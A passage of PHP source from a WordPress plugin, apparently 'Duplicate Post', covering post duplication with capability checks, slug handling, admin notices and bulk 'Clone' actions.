			if ( 'publish' == $new_post_status || 'future' == $new_post_status ){
				// check if the user has the right capability
				if(is_post_type_hierarchical( $post->post_type )){
					if(!current_user_can('publish_pages')){
						$new_post_status = 'pending';
					}
				} else {
					if(!current_user_can('publish_posts')){
						$new_post_status = 'pending';
					}
				}
			}
		}
	}	
	
	$new_post_author = wp_get_current_user();
	$new_post_author_id = $new_post_author->ID;
	if ( get_option('duplicate_post_copyauthor') == '1' ){
		// check if the user has the right capability
		if(is_post_type_hierarchical( $post->post_type )){
			if(current_user_can('edit_others_pages')){
				$new_post_author_id = $post->post_author;
			}
		} else {
			if(current_user_can('edit_others_posts')){
				$new_post_author_id = $post->post_author;
			}
		}
	}
	
	$menu_order = (get_option('duplicate_post_copymenuorder') == '1') ? $post->menu_order : 0;
	$increase_menu_order_by = get_option('duplicate_post_increase_menu_order_by');
	if(!empty($increase_menu_order_by) && is_numeric($increase_menu_order_by)){
		$menu_order += intval($increase_menu_order_by);
	}

	$new_post = array(
	'menu_order' => $menu_order,
	'comment_status' => $post->comment_status,
	'ping_status' => $post->ping_status,
	'post_author' => $new_post_author_id,
	'post_content' => (get_option('duplicate_post_copycontent') == '1') ? $post->post_content : "" ,
	'post_content_filtered' => (get_option('duplicate_post_copycontent') == '1') ? $post->post_content_filtered : "" ,			
	'post_excerpt' => (get_option('duplicate_post_copyexcerpt') == '1') ? $post->post_excerpt : "",
	'post_mime_type' => $post->post_mime_type,
	'post_parent' => $new_post_parent = empty($parent_id)? $post->post_parent : $parent_id,
	'post_password' => (get_option('duplicate_post_copypassword') == '1') ? $post->post_password: "",
	'post_status' => $new_post_status,
	'post_title' => $title,
	'post_type' => $post->post_type,
	);

	if(get_option('duplicate_post_copydate') == 1){
		$new_post['post_date'] = $new_post_date =  $post->post_date ;
		$new_post['post_date_gmt'] = get_gmt_from_date($new_post_date);
	}

	$new_post_id = wp_insert_post(wp_slash($new_post));

	// If the copy is published or scheduled, we have to set a proper slug.
	if ($new_post_status == 'publish' || $new_post_status == 'future'){
		$post_name = $post->post_name;
		if(get_option('duplicate_post_copyslug') != 1){
			$post_name = '';
		}
		$post_name = wp_unique_post_slug($post_name, $new_post_id, $new_post_status, $post->post_type, $new_post_parent);

		$new_post = array();
		$new_post['ID'] = $new_post_id;
		$new_post['post_name'] = $post_name;

		// Update the post into the database
		wp_update_post( wp_slash($new_post) );
	}

	// If you have written a plugin which uses non-WP database tables to save
	// information about a post you can hook this action to dupe that data.
	if ($post->post_type == 'page' || is_post_type_hierarchical( $post->post_type ))
		do_action( 'dp_duplicate_page', $new_post_id, $post );
	else
		do_action( 'dp_duplicate_post', $new_post_id, $post );

	delete_post_meta($new_post_id, '_dp_original');
	add_post_meta($new_post_id, '_dp_original', $post->ID);

	do_action('duplicate_post_post_copy');
	
	return $new_post_id;
}

//Add some links on the plugin page
add_filter('plugin_row_meta', 'duplicate_post_add_plugin_links', 10, 2);

function duplicate_post_add_plugin_links($links, $file) {
	if ( $file == plugin_basename(dirname(__FILE__).'/duplicate-post.php') ) {
		$links[] = '<a href="http://lopo.it/duplicate-post-plugin">' . esc_html__('Donate', 'duplicate-post') . '</a>';
		$links[] = '<a href="https://translate.wordpress.org/projects/wp-plugins/duplicate-post">' . esc_html__('Translate', 'duplicate-post') . '</a>';
	}
	return $links;
}

/*** NOTICES ***/

add_action( 'admin_notices', 'duplicate_post_action_admin_notice' );
 
function duplicate_post_action_admin_notice() {
  if ( ! empty( $_REQUEST['cloned'] ) ) {
    $copied_posts = intval( $_REQUEST['cloned'] );
    printf( '<div id="message" class="updated fade"><p>' .
      _n( '%s item copied.',
        '%s items copied.',
        $copied_posts,
        'duplicate-post'
      ) . '</p></div>', $copied_posts );
    remove_query_arg( 'cloned' );
  }
}


/*** BULK ACTIONS ***/

add_action('admin_init', 'duplicate_post_add_bulk_filters_for_enabled_post_types');

function duplicate_post_add_bulk_filters_for_enabled_post_types(){
	if(get_option('duplicate_post_show_bulkactions') != 1) return;
	$duplicate_post_types_enabled = get_option('duplicate_post_types_enabled', array ('post', 'page'));
	if(!is_array($duplicate_post_types_enabled)) $duplicate_post_types_enabled = array($duplicate_post_types_enabled);
	foreach($duplicate_post_types_enabled as $duplicate_post_type_enabled){
		add_filter( "bulk_actions-edit-{$duplicate_post_type_enabled}", 'duplicate_post_register_bulk_action' );
		add_filter( "handle_bulk_actions-edit-{$duplicate_post_type_enabled}", 'duplicate_post_action_handler', 10, 3 );
	}
}

function duplicate_post_register_bulk_action($bulk_actions) {
	$bulk_actions['duplicate_post_clone'] = esc_html__( 'Clone', 'duplicate-post');
	return $bulk_actions;
}

function duplicate_post_action_handler( $redirect_to, $doaction, $post_ids ) {
	if ( $doaction !== 'duplicate_post_clone' ) {
		return $redirect_to;
	}
	$counter = 0;
	foreach ( $post_ids as $post_id ) {
		$post = get_post($post_id);
		if(!empty($post)){
			if( get_option('duplicate_post_copychildren') != 1
					|| !is_post_type_hierarchical( $post->post_type )
					|| (is_post_type_hierarchical( $post->post_type ) && !duplicate_post_has_ancestors_marked($post, $post_ids))){
						if(duplicate_post_create_duplicate($post)){
							$counter++;
						}
			}
		}
	}
	$redirect_to = add_query_arg( 'cloned', $counter, $redirect_to );
	return $redirect_to;
}

function duplicate_post_has_ancestors_marked($post, $post_ids){
	$ancestors_in_array = 0;
	$parent = $post->ID;
	while ($parent = wp_get_post_parent_id($parent)){
		if(in_array($parent, $post_ids)){
			$ancestors_in_array++;
		}
	}
	return ($ancestors_in_array !== 0);
}
